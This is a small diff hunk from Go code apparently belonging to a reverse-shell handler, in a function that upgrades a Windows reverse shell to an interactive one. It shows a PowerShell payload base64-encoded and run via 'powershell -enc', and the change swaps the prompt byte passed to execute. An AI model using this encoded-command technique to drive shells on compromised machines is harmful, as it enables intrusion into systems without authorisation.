@@ -309,6 +309,6 @@ func (terminal *Terminal) interactiveReverseShellWindows() {
 	payloadPowershell, _ = utils.Utf16leBase64(payloadPowershell)
 	command := "powershell -enc " + payloadPowershell
 	terminal.Log.Debug("Send the command: " + command)
-	terminal.execute(command, []byte{promptWindows1})
+	terminal.execute(command, []byte{0})
 	terminal.Con.Close()
 }
